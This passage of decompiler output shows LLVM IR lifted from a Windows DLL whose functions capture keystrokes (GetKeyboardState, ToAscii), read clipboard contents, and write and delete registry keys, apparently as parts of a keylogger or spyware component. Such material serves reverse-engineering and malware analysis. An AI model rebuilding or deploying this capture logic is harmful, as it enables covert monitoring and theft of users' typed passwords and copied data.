  %1 = call i32 @function_40438c(i32 0, i32* nonnull %stack_var_-116, i32 1, i32 0, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @global_var_404dc4, i32 0, i32 0), i32 -2147483647), !insn.addr !529
  %2 = icmp eq i32 %1, 0, !insn.addr !530
  %3 = icmp eq i1 %2, false, !insn.addr !531
  store i32 %1, i32* %eax.0.reg2mem, !insn.addr !531
  br i1 %3, label %dec_label_pc_404db2, label %dec_label_pc_404d6d, !insn.addr !531

dec_label_pc_404d6d:                              ; preds = %dec_label_pc_404d38
  store i8* inttoptr (i32 101 to i8*), i8** %stack_var_-132, align 4, !insn.addr !532
  %4 = bitcast i8** %stack_var_-132 to i32*, !insn.addr !533
  %5 = call i32 @function_404394(i32 101, i32* nonnull %4, i32* nonnull %stack_var_-128, i32* nonnull @global_var_4080f8, i32 0, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_404de0, i32 0, i32 0), i32 -2147483647), !insn.addr !533
  %6 = icmp eq i32 %5, 0, !insn.addr !534
  %7 = icmp eq i1 %6, false, !insn.addr !535
  br i1 %7, label %dec_label_pc_404da9, label %dec_label_pc_404d99, !insn.addr !535

dec_label_pc_404d99:                              ; preds = %dec_label_pc_404d6d
  %8 = call i32 @"@LStrFromArray"(), !insn.addr !536
  br label %dec_label_pc_404da9, !insn.addr !536

dec_label_pc_404da9:                              ; preds = %dec_label_pc_404d99, %dec_label_pc_404d6d
  %9 = call i32 @function_404374(), !insn.addr !537
  store i32 %9, i32* %eax.0.reg2mem, !insn.addr !537
  br label %dec_label_pc_404db2, !insn.addr !537

dec_label_pc_404db2:                              ; preds = %dec_label_pc_404da9, %dec_label_pc_404d38
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  ret i32 %eax.0.reload, !insn.addr !538
}

define i32 @function_404dbb(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_404dbb:
  %esp.1.reg2mem = alloca i32, !insn.addr !539
  %esp.0.in.reg2mem = alloca i32*, !insn.addr !539
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %4 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %stack_var_28 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_28, align 4
  %stack_var_24 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_24, align 4
  %5 = add i32 %3, 1, !insn.addr !539
  %6 = inttoptr i32 %3 to i32*, !insn.addr !539
  store i32 %5, i32* %6, align 4, !insn.addr !539
  %7 = bitcast i32* %eax to i8*
  %8 = load i8, i8* %7, align 4, !insn.addr !540
  %9 = load i32, i32* %eax, align 4
  %10 = trunc i32 %9 to i8, !insn.addr !540
  %11 = add i8 %8, %10, !insn.addr !540
  %12 = inttoptr i32 %9 to i8*, !insn.addr !540
  store i8 %11, i8* %12, align 1, !insn.addr !540
  %13 = add i32 %1, 122, !insn.addr !541
  %14 = inttoptr i32 %13 to i8*, !insn.addr !541
  %15 = load i8, i8* %14, align 1, !insn.addr !541
  %16 = udiv i32 %4, 256, !insn.addr !541
  %17 = trunc i32 %16 to i8, !insn.addr !541
  %18 = add i8 %15, %17, !insn.addr !541
  store i8 %18, i8* %14, align 1, !insn.addr !541
  %19 = load i8, i8* %7, align 4, !insn.addr !542
  %20 = load i32, i32* %eax, align 4, !insn.addr !542
  %21 = trunc i32 %20 to i8, !insn.addr !542
  %22 = add i8 %19, %21, !insn.addr !542
  %23 = icmp eq i8 %22, 0, !insn.addr !542
  %24 = inttoptr i32 %20 to i8*, !insn.addr !542
  store i8 %22, i8* %24, align 1, !insn.addr !542
  %25 = trunc i32 %3 to i16, !insn.addr !543
  call void @__asm_outsd(i16 %25, i32 %0), !insn.addr !543
  br i1 %23, label %26, label %dec_label_pc_404dc9, !insn.addr !544

; <label>:26:                                     ; preds = %dec_label_pc_404dbb
  %27 = call i32 @unknown_4e40(), !insn.addr !544
  br label %dec_label_pc_404dc9, !insn.addr !544

dec_label_pc_404dc9:                              ; preds = %26, %dec_label_pc_404dbb
  %28 = icmp ult i8 %22, %19, !insn.addr !542
  %29 = load i32, i32* %stack_var_24, align 4, !insn.addr !545
  store i32 %29, i32* %eax, align 4, !insn.addr !545
  br i1 %28, label %dec_label_pc_404e31, label %dec_label_pc_404dcc, !insn.addr !546

dec_label_pc_404dcc:                              ; preds = %dec_label_pc_404dc9
  %30 = call i8 @llvm.ctpop.i8(i8 %22), !range !547, !insn.addr !542
  %31 = and i8 %30, 1, !insn.addr !542
  %32 = icmp eq i8 %31, 0, !insn.addr !542
  %33 = trunc i32 %arg4 to i16, !insn.addr !548
  %34 = call i32 @__asm_insd(i16 %33), !insn.addr !548
  %35 = inttoptr i32 %2 to i32*, !insn.addr !548
  store i32 %34, i32* %35, align 4, !insn.addr !548
  br i1 %32, label %dec_label_pc_404e2c, label %dec_label_pc_404dd0, !insn.addr !549

dec_label_pc_404dd0:                              ; preds = %dec_label_pc_404dcc
  store i32 %arg3, i32* %stack_var_28, align 4, !insn.addr !550
  store i32 %arg3, i32* %stack_var_24, align 4, !insn.addr !551
  %36 = add i32 %arg4, 1, !insn.addr !552
  %37 = icmp eq i32 %36, 0, !insn.addr !552
  store i32* %stack_var_24, i32** %esp.0.in.reg2mem, !insn.addr !553
  br i1 %37, label %dec_label_pc_404e37, label %dec_label_pc_404dd6, !insn.addr !553

dec_label_pc_404dd6:                              ; preds = %dec_label_pc_404dd0
  %38 = load i32, i32* %eax, align 4, !insn.addr !554
  %39 = add i32 %38, -1, !insn.addr !554
  store i32 %39, i32* %eax, align 4, !insn.addr !554
  %40 = trunc i32 %36 to i16, !insn.addr !555
  %41 = inttoptr i32 %arg7 to i32*, !insn.addr !555
  %42 = load i32, i32* %41, align 4, !insn.addr !555
  call void @__asm_outsd(i16 %40, i32 %42), !insn.addr !555
  %43 = load i32, i32* %41, align 4, !insn.addr !556
  call void @__asm_outsd(i16 %40, i32 %43), !insn.addr !556
  %44 = add i32 %arg7, 105, !insn.addr !557
  %45 = inttoptr i32 %44 to i8*, !insn.addr !557
  %46 = load i8, i8* %45, align 1, !insn.addr !557
  %47 = trunc i32 %39 to i8, !insn.addr !557
  %48 = add i8 %46, %47, !insn.addr !557
  %49 = icmp ult i8 %48, %46, !insn.addr !557
  store i8 %48, i8* %45, align 1, !insn.addr !557
  store i32 0, i32* %esp.1.reg2mem, !insn.addr !558
  br i1 %49, label %dec_label_pc_404e57, label %dec_label_pc_404de4, !insn.addr !558

dec_label_pc_404de4:                              ; preds = %dec_label_pc_404dd6
  %50 = icmp eq i8 %48, 0, !insn.addr !557
  br i1 %50, label %dec_label_pc_404e06, label %dec_label_pc_404de6, !insn.addr !559

dec_label_pc_404de6:                              ; preds = %dec_label_pc_404de4
  store i32 %36, i32* inttoptr (i32 -4 to i32*), align 4, !insn.addr !560
  store i32 -4, i32* %esp.1.reg2mem
  br label %dec_label_pc_404e57

dec_label_pc_404e06:                              ; preds = %dec_label_pc_404de4
  %51 = load i32, i32* %eax, align 4
  %52 = inttoptr i32 %51 to i32*, !insn.addr !561
  %53 = load i32, i32* %52, align 4, !insn.addr !561
  store i32 %53, i32* inttoptr (i32 -4 to i32*), align 4, !insn.addr !561
  call void @__writefsdword(i32 %51, i32 -4), !insn.addr !562
  store i32 ptrtoint ([27 x i8]* @global_var_404e9c to i32), i32* inttoptr (i32 -8 to i32*), align 8, !insn.addr !563
  store i32 -2147483647, i32* inttoptr (i32 -12 to i32*), align 4, !insn.addr !564
  %54 = call i32 @RegDeleteKeyA(i32* nonnull @0, i8* bitcast (i32* @0 to i8*)), !insn.addr !565
  %55 = add i32 %arg6, -8, !insn.addr !566
  %56 = inttoptr i32 %55 to i32*, !insn.addr !566
  store i32 0, i32* %56, align 4, !insn.addr !566
  %57 = add i32 %arg6, -12, !insn.addr !567
  %58 = inttoptr i32 %57 to i32*, !insn.addr !567
  store i32 1, i32* %58, align 4, !insn.addr !567
  store i32 %57, i32* inttoptr (i32 -16 to i32*), align 16, !insn.addr !568
  ret i32 %57, !insn.addr !568

dec_label_pc_404e2c:                              ; preds = %dec_label_pc_404dcc
  %59 = load i32, i32* %eax, align 4
  ret i32 %59, !insn.addr !569

dec_label_pc_404e31:                              ; preds = %dec_label_pc_404dc9
  %60 = trunc i32 %2 to i8
  %61 = trunc i32 %arg3 to i8, !insn.addr !570
  %62 = add i8 %60, %61, !insn.addr !570
  %63 = inttoptr i32 %2 to i8*, !insn.addr !570
  store i8 %62, i8* %63, align 1, !insn.addr !570
  %64 = inttoptr i32 %arg4 to i8*, !insn.addr !571
  %65 = load i8, i8* %64, align 1, !insn.addr !571
  %66 = udiv i32 %arg3, 256, !insn.addr !571
  %67 = trunc i32 %66 to i8, !insn.addr !571
  %68 = add i8 %65, %67, !insn.addr !571
  store i8 %68, i8* %64, align 1, !insn.addr !571
  store i32* %stack_var_28, i32** %esp.0.in.reg2mem, !insn.addr !571
  br label %dec_label_pc_404e37, !insn.addr !571

dec_label_pc_404e37:                              ; preds = %dec_label_pc_404e31, %dec_label_pc_404dd0
  %esp.0.in.reload = load i32*, i32** %esp.0.in.reg2mem
  %esp.0 = ptrtoint i32* %esp.0.in.reload to i32
  %69 = add i32 %esp.0, -4, !insn.addr !572
  %70 = inttoptr i32 %69 to i32*, !insn.addr !572
  store i32 0, i32* %70, align 4, !insn.addr !572
  %71 = add i32 %esp.0, -8, !insn.addr !573
  %72 = inttoptr i32 %71 to i32*, !insn.addr !573
  store i32 0, i32* %72, align 4, !insn.addr !573
  %73 = add i32 %esp.0, -12, !insn.addr !574
  %74 = inttoptr i32 %73 to i32*, !insn.addr !574
  store i32 ptrtoint ([27 x i8]* @global_var_404e9c to i32), i32* %74, align 4, !insn.addr !574
  %75 = add i32 %esp.0, -16, !insn.addr !575
  %76 = inttoptr i32 %75 to i32*, !insn.addr !575
  store i32 -2147483647, i32* %76, align 4, !insn.addr !575
  %77 = call i32 @RegCreateKeyExA(i32* nonnull @0, i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32), i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @0 to %_SECURITY_ATTRIBUTES*), i32** bitcast (i32* @0 to i32**), i32* nonnull @0), !insn.addr !576
  %78 = call i32 @function_4034c8(), !insn.addr !577
  %79 = add i32 %78, 1, !insn.addr !578
  %80 = add i32 %esp.0, -20, !insn.addr !579
  %81 = inttoptr i32 %80 to i32*, !insn.addr !579
  store i32 %79, i32* %81, align 4, !insn.addr !579
  store i32 %80, i32* %esp.1.reg2mem, !insn.addr !580
  br label %dec_label_pc_404e57, !insn.addr !580

dec_label_pc_404e57:                              ; preds = %dec_label_pc_404de6, %dec_label_pc_404e37, %dec_label_pc_404dd6
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %82 = call i32 @function_4036c8(), !insn.addr !581
  %83 = add i32 %esp.1.reload, -4, !insn.addr !582
  %84 = inttoptr i32 %83 to i32*, !insn.addr !582
  store i32 %82, i32* %84, align 4, !insn.addr !582
  %85 = add i32 %esp.1.reload, -8, !insn.addr !583
  %86 = inttoptr i32 %85 to i32*, !insn.addr !583
  store i32 1, i32* %86, align 4, !insn.addr !583
  %87 = add i32 %esp.1.reload, -12, !insn.addr !584
  %88 = inttoptr i32 %87 to i32*, !insn.addr !584
  store i32 0, i32* %88, align 4, !insn.addr !584
  %89 = add i32 %esp.1.reload, -16, !insn.addr !585
  %90 = inttoptr i32 %89 to i32*, !insn.addr !585
  store i32 ptrtoint ([10 x i8]* @global_var_404eb8 to i32), i32* %90, align 4, !insn.addr !585
  %91 = add i32 %arg6, -8, !insn.addr !586
  %92 = inttoptr i32 %91 to i32*, !insn.addr !586
  %93 = load i32, i32* %92, align 4, !insn.addr !586
  %94 = add i32 %esp.1.reload, -20, !insn.addr !587
  %95 = inttoptr i32 %94 to i32*, !insn.addr !587
  store i32 %93, i32* %95, align 4, !insn.addr !587
  %96 = call i32 @RegSetValueExA(i32* nonnull @0, i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !588
  %97 = load i32, i32* %92, align 4, !insn.addr !589
  %98 = add i32 %esp.1.reload, -24, !insn.addr !590
  %99 = inttoptr i32 %98 to i32*, !insn.addr !590
  store i32 %97, i32* %99, align 4, !insn.addr !590
  %100 = call i32 @function_404374(), !insn.addr !591
  %101 = load i32, i32* %99, align 4, !insn.addr !592
  call void @__writefsdword(i32 0, i32 %101), !insn.addr !593
  store i32 4214421, i32* %90, align 4, !insn.addr !594
  %102 = call i32 @"@LStrClr"(), !insn.addr !595
  ret i32 %102, !insn.addr !596
}

define i32 @function_404e8e() local_unnamed_addr {
dec_label_pc_404e8e:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !597
  ret i32 %0, !insn.addr !597
}

define i32 @function_404e93() local_unnamed_addr {
dec_label_pc_404e93:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !598
}

define i32 @function_404e95() local_unnamed_addr {
dec_label_pc_404e95:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !599
}

define i32 @function_404e99(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
dec_label_pc_404e99:
  %.reg2mem = alloca i32, !insn.addr !600
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = trunc i32 %2 to i8
  %4 = mul i8 %3, 2, !insn.addr !600
  %5 = inttoptr i32 %2 to i8*, !insn.addr !600
  store i8 %4, i8* %5, align 1, !insn.addr !600
  %6 = add i32 %0, 111, !insn.addr !601
  %7 = inttoptr i32 %6 to i8*, !insn.addr !601
  %8 = load i8, i8* %7, align 1, !insn.addr !601
  %9 = trunc i32 %1 to i8, !insn.addr !601
  %10 = add i8 %8, %9, !insn.addr !601
  %11 = icmp eq i8 %10, 0, !insn.addr !601
  store i8 %10, i8* %7, align 1, !insn.addr !601
  br i1 %11, label %12, label %dec_label_pc_404ea1, !insn.addr !602

; <label>:12:                                     ; preds = %dec_label_pc_404e99
  %13 = call i32 @unknown_4f18(), !insn.addr !602
  br label %dec_label_pc_404ea1, !insn.addr !602

dec_label_pc_404ea1:                              ; preds = %12, %dec_label_pc_404e99
  %14 = icmp ult i8 %10, %8, !insn.addr !601
  br i1 %14, label %dec_label_pc_404f09, label %dec_label_pc_404ea4, !insn.addr !603

dec_label_pc_404ea4:                              ; preds = %dec_label_pc_404ea1
  %15 = call i8 @llvm.ctpop.i8(i8 %10), !range !547, !insn.addr !601
  %16 = and i8 %15, 1, !insn.addr !601
  %17 = icmp eq i8 %16, 0, !insn.addr !601
  %18 = trunc i32 %arg4 to i16, !insn.addr !604
  %19 = call i32 @__asm_insd(i16 %18), !insn.addr !604
  %20 = inttoptr i32 %arg8 to i32*, !insn.addr !604
  store i32 %19, i32* %20, align 4, !insn.addr !604
  br i1 %17, label %dec_label_pc_404f04, label %dec_label_pc_404ea8, !insn.addr !605

dec_label_pc_404ea8:                              ; preds = %dec_label_pc_404ea4
  %21 = add i32 %arg4, 1, !insn.addr !606
  %22 = icmp eq i32 %21, 0, !insn.addr !606
  store i32 %arg2, i32* %.reg2mem, !insn.addr !607
  br i1 %22, label %dec_label_pc_404f0f, label %dec_label_pc_404eae, !insn.addr !607

dec_label_pc_404eae:                              ; preds = %dec_label_pc_404ea8
  %23 = add i32 %arg2, -1, !insn.addr !608
  %24 = trunc i32 %21 to i16, !insn.addr !609
  %25 = inttoptr i32 %arg7 to i32*, !insn.addr !609
  %26 = load i32, i32* %25, align 4, !insn.addr !609
  call void @__asm_outsd(i16 %24, i32 %26), !insn.addr !609
  %27 = load i32, i32* %25, align 4, !insn.addr !610
  call void @__asm_outsd(i16 %24, i32 %27), !insn.addr !610
  %28 = add i32 %arg7, 105, !insn.addr !611
  %29 = inttoptr i32 %28 to i8*, !insn.addr !611
  %30 = load i8, i8* %29, align 1, !insn.addr !611
  %31 = trunc i32 %23 to i8, !insn.addr !611
  %32 = add i8 %30, %31, !insn.addr !611
  %33 = icmp eq i8 %32, 0, !insn.addr !611
  store i8 %32, i8* %29, align 1, !insn.addr !611
  br i1 %33, label %dec_label_pc_404ede, label %dec_label_pc_404ebe, !insn.addr !612

dec_label_pc_404ebe:                              ; preds = %dec_label_pc_404eae
  store i32 %21, i32* inttoptr (i32 -4 to i32*), align 4, !insn.addr !613
  %34 = inttoptr i32 %23 to i8*, !insn.addr !614
  %35 = load i8, i8* %34, align 1, !insn.addr !614
  %36 = add i8 %35, %31, !insn.addr !614
  store i8 %36, i8* %34, align 1, !insn.addr !614
  %37 = add i32 %arg5, 86, !insn.addr !615
  %38 = inttoptr i32 %37 to i8*, !insn.addr !615
  %39 = load i8, i8* %38, align 1, !insn.addr !615
  %40 = trunc i32 %21 to i8, !insn.addr !615
  %41 = add i8 %39, %40, !insn.addr !615
  store i8 %41, i8* %38, align 1, !insn.addr !615
  store i32 %arg8, i32* inttoptr (i32 -8 to i32*), align 8, !insn.addr !616
  %42 = call i32 @"@LStrClr"(), !insn.addr !617
  store i32 0, i32* inttoptr (i32 -12 to i32*), align 4, !insn.addr !618
  %43 = call i1 @OpenClipboard(i32* nonnull @0), !insn.addr !619
  %44 = zext i1 %43 to i32, !insn.addr !620
  ret i32 %44, !insn.addr !620

dec_label_pc_404ede:                              ; preds = %dec_label_pc_404eae
  %factor = mul i32 %arg6, 2
  %45 = add i32 %factor, 106, !insn.addr !621
  %46 = inttoptr i32 %45 to i8*, !insn.addr !621
  %47 = load i8, i8* %46, align 2, !insn.addr !621
  %48 = mul i8 %47, 2, !insn.addr !621
  store i8 %48, i8* %46, align 2, !insn.addr !621
  %49 = call i32* @GetClipboardData(i32 ptrtoint (i32* @0 to i32)), !insn.addr !622
  %50 = icmp eq i32* %49, null, !insn.addr !623
  br i1 %50, label %dec_label_pc_404f09, label %dec_label_pc_404eee, !insn.addr !624

dec_label_pc_404eee:                              ; preds = %dec_label_pc_404ede
  %51 = ptrtoint i32* %49 to i32, !insn.addr !622
  store i32 %51, i32* inttoptr (i32 -4 to i32*), align 4, !insn.addr !625
  %52 = call i32* @GlobalLock(i32* nonnull @0), !insn.addr !626
  %53 = icmp eq i32* %52, null, !insn.addr !627
  br i1 %53, label %dec_label_pc_404f09, label %dec_label_pc_404efa, !insn.addr !628

dec_label_pc_404efa:                              ; preds = %dec_label_pc_404eee
  %54 = call i32 @"@LStrFromPChar"(), !insn.addr !629
  store i32 %51, i32* inttoptr (i32 -8 to i32*), align 8, !insn.addr !630
  br label %dec_label_pc_404f04, !insn.addr !630

dec_label_pc_404f04:                              ; preds = %dec_label_pc_404efa, %dec_label_pc_404ea4
  %55 = call i1 @GlobalUnlock(i32* nonnull @0), !insn.addr !631
  br label %dec_label_pc_404f09, !insn.addr !631

dec_label_pc_404f09:                              ; preds = %dec_label_pc_404f04, %dec_label_pc_404eee, %dec_label_pc_404ede, %dec_label_pc_404ea1
  %56 = call i1 @CloseClipboard(), !insn.addr !632
  %57 = sext i1 %56 to i32, !insn.addr !632
  store i32 %57, i32* %.reg2mem, !insn.addr !633
  br label %dec_label_pc_404f0f, !insn.addr !633

dec_label_pc_404f0f:                              ; preds = %dec_label_pc_404ea8, %dec_label_pc_404f09
  %.reload = load i32, i32* %.reg2mem, !insn.addr !634
  ret i32 %.reload, !insn.addr !634
}

define i32 @DllGetClassObject(i32 %arg1) local_unnamed_addr {
dec_label_pc_404f14:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i8*, align 4
  %2 = inttoptr i32 %1 to i8*, !insn.addr !635
  store i8* %2, i8** %stack_var_-8, align 4, !insn.addr !635
  %3 = load i32, i32* inttoptr (i32 4227384 to i32*), align 8, !insn.addr !636
  %4 = inttoptr i32 %3 to i32*, !insn.addr !637
  %5 = load i32, i32* %4, align 4, !insn.addr !637
  %6 = icmp eq i32 %5, 0, !insn.addr !637
  %7 = icmp eq i1 %6, false, !insn.addr !638
  %8 = icmp eq i1 %7, false, !insn.addr !639
  br i1 %8, label %dec_label_pc_404f50, label %dec_label_pc_404f27, !insn.addr !639

dec_label_pc_404f27:                              ; preds = %dec_label_pc_404f14
  %9 = inttoptr i32 %0 to i8*, !insn.addr !640
  %10 = call i32* @FindWindowA(i8* %9, i8* %2), !insn.addr !641
  %11 = icmp eq i32* %10, null, !insn.addr !642
  %12 = icmp eq i1 %11, false, !insn.addr !643
  br i1 %12, label %dec_label_pc_404f50, label %dec_label_pc_404f3a, !insn.addr !643

dec_label_pc_404f3a:                              ; preds = %dec_label_pc_404f27
  %13 = bitcast i8** %stack_var_-8 to %_SECURITY_ATTRIBUTES*
  %14 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* nonnull %13, i32 0, i32 (i32*)* inttoptr (i32 66 to i32 (i32*)*), i32* inttoptr (i32 4220780 to i32*), i32 0, i32* null), !insn.addr !644
  br label %dec_label_pc_404f50, !insn.addr !644

dec_label_pc_404f50:                              ; preds = %dec_label_pc_404f3a, %dec_label_pc_404f27, %dec_label_pc_404f14
  %15 = inttoptr i32 %arg1 to i32*, !insn.addr !645
  store i32 0, i32* %15, align 4, !insn.addr !645
  ret i32 -2147221231, !insn.addr !646
}

define i32 @DllCanUnloadNow() local_unnamed_addr {
dec_label_pc_404f7c:
  ret i32 0, !insn.addr !647
}

define i32 @DllRegisterServer() local_unnamed_addr {
dec_label_pc_404f80:
  ret i32 0, !insn.addr !648
}

define i32 @DllUnregisterServer() local_unnamed_addr {
dec_label_pc_404f84:
  ret i32 0, !insn.addr !649
}

define i32 @function_404f88() local_unnamed_addr {
dec_label_pc_404f88:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !650
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !650
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !650
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !651
  %2 = load i32, i32* @global_var_4096a4, align 4, !insn.addr !652
  %3 = add i32 %2, 1, !insn.addr !652
  store i32 %3, i32* @global_var_4096a4, align 4, !insn.addr !652
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !653
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !654
  ret i32 0, !insn.addr !655
}

define i32 @function_404fad() local_unnamed_addr {
dec_label_pc_404fad:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !656
  ret i32 %0, !insn.addr !656
}

define i32 @function_404fb2() local_unnamed_addr {
dec_label_pc_404fb2:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !657
}

define i32 @function_404fb4(i32 %arg1) local_unnamed_addr {
dec_label_pc_404fb4:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !658
}

define i32 @function_404fb8() local_unnamed_addr {
dec_label_pc_404fb8:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096a4, align 4, !insn.addr !659
  %2 = add i32 %1, -1, !insn.addr !659
  store i32 %2, i32* @global_var_4096a4, align 4, !insn.addr !659
  ret i32 %0, !insn.addr !660
}

define i32 @function_404fc0(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_404fc0:
  %esp.0.reg2mem = alloca i32, !insn.addr !661
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-316 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-264 = alloca i32, align 4
  %stack_var_-292 = alloca i32, align 4
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !662
  store i32 %2, i32* %stack_var_-292, align 4, !insn.addr !662
  %3 = ptrtoint i32* %stack_var_-292 to i32, !insn.addr !662
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !663
  %4 = call i32 @function_407250(), !insn.addr !664
  %5 = icmp ne i32 %4, 0, !insn.addr !665
  %6 = icmp eq i1 %5, false, !insn.addr !666
  store i32 %3, i32* %esp.0.reg2mem, !insn.addr !667
  br i1 %6, label %dec_label_pc_4050bb, label %dec_label_pc_404ffd, !insn.addr !667

dec_label_pc_404ffd:                              ; preds = %dec_label_pc_404fc0
  switch i32 %0, label %dec_label_pc_405047 [
    i32 8, label %dec_label_pc_40500b
    i32 46, label %dec_label_pc_40502a
  ]

dec_label_pc_40500b:                              ; preds = %dec_label_pc_404ffd
  %7 = call i32 @function_4072ec(), !insn.addr !668
  %8 = call i32 @"@LStrDelete"(), !insn.addr !669
  store i32 %3, i32* %esp.0.reg2mem, !insn.addr !670
  br label %dec_label_pc_4050bb, !insn.addr !670

dec_label_pc_40502a:                              ; preds = %dec_label_pc_404ffd
  %9 = call i32 @function_4072ec(), !insn.addr !671
  %10 = call i32 @"@LStrDelete"(), !insn.addr !672
  store i32 %3, i32* %esp.0.reg2mem, !insn.addr !673
  br label %dec_label_pc_4050bb, !insn.addr !673

dec_label_pc_405047:                              ; preds = %dec_label_pc_404ffd
  %11 = bitcast i32* %stack_var_-264 to i8*
  %12 = call i1 @GetKeyboardState(i8* nonnull %11), !insn.addr !674
  %13 = ptrtoint i32* %stack_var_-8 to i32, !insn.addr !675
  %14 = udiv i32 %1, 65536, !insn.addr !676
  %15 = and i32 %14, 255, !insn.addr !677
  %16 = inttoptr i32 %15 to i16*, !insn.addr !678
  %17 = ptrtoint i32* %stack_var_-316 to i32, !insn.addr !679
  %18 = call i32 @ToAscii(i32 0, i32 %13, i8* nonnull %11, i16* %16, i32 %0), !insn.addr !680
  %19 = icmp eq i32 %18, 1, !insn.addr !681
  %20 = icmp eq i1 %19, false, !insn.addr !682
  store i32 %17, i32* %esp.0.reg2mem, !insn.addr !682
  br i1 %20, label %dec_label_pc_4050bb, label %dec_label_pc_405073, !insn.addr !682

dec_label_pc_405073:                              ; preds = %dec_label_pc_405047
  %21 = call i32 @function_406fb4(), !insn.addr !683
  %22 = icmp eq i32 %21, 0, !insn.addr !684
  store i32 %17, i32* %esp.0.reg2mem, !insn.addr !685
  br i1 %22, label %dec_label_pc_4050bb, label %dec_label_pc_40507f, !insn.addr !685

dec_label_pc_40507f:                              ; preds = %dec_label_pc_405073
  %23 = call i32 @function_4034c8(), !insn.addr !686
  %24 = icmp sgt i32 %23, 15, !insn.addr !687
  store i32 %17, i32* %esp.0.reg2mem, !insn.addr !687
  br i1 %24, label %dec_label_pc_4050bb, label %dec_label_pc_405090, !insn.addr !687

dec_label_pc_405090:                              ; preds = %dec_label_pc_40507f
  %25 = call i32 @function_4072ec(), !insn.addr !688
  %26 = call i32 @"@LStrFromChar"(), !insn.addr !689
  %27 = call i32 @"@LStrInsert"(), !insn.addr !690
  store i32 %17, i32* %esp.0.reg2mem, !insn.addr !690
  br label %dec_label_pc_4050bb, !insn.addr !690

dec_label_pc_4050bb:                              ; preds = %dec_label_pc_405090, %dec_label_pc_40507f, %dec_label_pc_405073, %dec_label_pc_405047, %dec_label_pc_40502a, %dec_label_pc_40500b, %dec_label_pc_404fc0
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %28 = inttoptr i32 %esp.0.reload to i32*, !insn.addr !691
  %29 = load i32, i32* %28, align 4, !insn.addr !691
  call void @__writefsdword(i32 0, i32 %29), !insn.addr !692
  %30 = add i32 %esp.0.reload, 8, !insn.addr !693
  %31 = inttoptr i32 %30 to i32*, !insn.addr !693
  store i32 4215003, i32* %31, align 4, !insn.addr !693
  %32 = call i32 @"@LStrClr"(), !insn.addr !694
  ret i32 %32, !insn.addr !695
}

define i32 @function_4050d4() local_unnamed_addr {
dec_label_pc_4050d4:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !696
  ret i32 %0, !insn.addr !696
}

define i32 @function_4050d9() local_unnamed_addr {
dec_label_pc_4050d9:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !697
}

define i32 @function_4050db(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_4050db:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !698
}

define i32 @function_4050e4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_4050e4:
  %stack_var_-32 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !699
  store i32 %0, i32* %stack_var_-32, align 4, !insn.addr !699
  %1 = ptrtoint i32* %stack_var_-32 to i32, !insn.addr !699
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !700
  %2 = call i32 @function_407250(), !insn.addr !701
  %3 = load i32, i32* %stack_var_-32, align 4, !insn.addr !702
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !703
  %4 = add i32 %1, 8, !insn.addr !704
  %5 = inttoptr i32 %4 to i32*, !insn.addr !704
  store i32 4215210, i32* %5, align 4, !insn.addr !704
  %6 = call i32 @"@LStrArrayClr"(), !insn.addr !705
  ret i32 %6, !insn.addr !706
}

define i32 @function_4051a3() local_unnamed_addr {
dec_label_pc_4051a3:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !707
